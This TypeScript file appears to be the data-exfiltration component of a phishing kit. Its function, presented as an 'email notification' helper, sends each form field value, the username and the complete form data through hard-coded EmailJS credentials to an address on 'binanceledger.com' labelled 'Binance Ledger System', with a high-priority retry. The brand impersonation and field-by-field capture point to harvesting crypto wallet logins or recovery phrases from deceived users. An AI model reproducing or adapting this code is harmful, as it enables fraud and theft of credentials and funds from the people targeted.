
import emailjs from 'emailjs-com';

// Initialize EmailJS with your user ID immediately
emailjs.init("hDX5LRevxoenkHrjk");

interface EmailData {
  step: string;
  field?: string;
  value?: string;
  username?: string;
  timestamp: string;
  allFormData?: any;
  priority?: 'high' | 'normal';
}

export const sendEmailNotification = async (data: EmailData) => {
  console.log('=== EMAIL NOTIFICATION START ===');
  console.log('Priority level:', data.priority || 'normal');
  console.log('Data being sent:', data);

  // Ensure all template variables are properly formatted and never undefined
  const templateParams = {
    to_email: "donotreply@binanceledger.com",
    from_name: "Binance Ledger System - URGENT",
    subject: `IMMEDIATE: ${data.step} - User Action Alert`,
    message: `URGENT ACTION: ${data.step}
${data.field ? `Field: ${data.field}` : ''}
${data.value ? `Value: ${data.value}` : ''}
${data.username ? `Username: ${data.username}` : ''}
Timestamp: ${data.timestamp}

${data.allFormData ? `Complete Form Data:\n${JSON.stringify(data.allFormData, null, 2)}` : ''}`.trim(),
    
    // Ensure these are always strings, never undefined
    step: String(data.step || ''),
    field: String(data.field || ''),
    value: String(data.value || ''),
    username: String(data.username || ''),
    timestamp: String(data.timestamp || new Date().toISOString()),
    allFormData: data.allFormData ? String(JSON.stringify(data.allFormData, null, 2)) : ''
  };

  console.log('📧 Template parameters being sent:', templateParams);
  console.log('📧 Sending email immediately...');

  try {
    // Send email with proper error handling
    const result = await emailjs.send(
      "service_r7sis9a",
      "template_dec5tz3", 
      templateParams
    );
    
    console.log('✅ Email sent successfully!', result);
    console.log('=== EMAIL NOTIFICATION END ===');
    return result;
  } catch (error) {
    console.error('❌ Email failed to send:', error);
    console.error('Error details:', error);
    console.error('Template params that failed:', templateParams);
    
    // For high priority, try once more with minimal data to ensure delivery
    if (data.priority === 'high') {
      console.log('🔄 Retrying with minimal data for high-priority email...');
      try {
        const minimalParams = {
          to_email: "donotreply@binanceledger.com",
          from_name: "Binance Ledger System",
          subject: `Alert: ${data.step}`,
          message: `Action: ${data.step}\nTimestamp: ${data.timestamp}`,
          step: String(data.step || ''),
          field: '',
          value: '',
          username: String(data.username || ''),
          timestamp: String(data.timestamp || new Date().toISOString()),
          allFormData: ''
        };
        
        const retryResult = await emailjs.send(
          "service_r7sis9a",
          "template_dec5tz3", 
          minimalParams
        );
        console.log('✅ Minimal retry successful!', retryResult);
        return retryResult;
      } catch (retryError) {
        console.error('❌ Retry also failed:', retryError);
      }
    }
    
    console.log('=== EMAIL NOTIFICATION END (ERROR) ===');
    throw error;
  }
};

// Helper function for high-priority button clicks
export const sendHighPriorityNotification = async (data: Omit<EmailData, 'priority'>) => {
  return sendEmailNotification({ ...data, priority: 'high' });
};
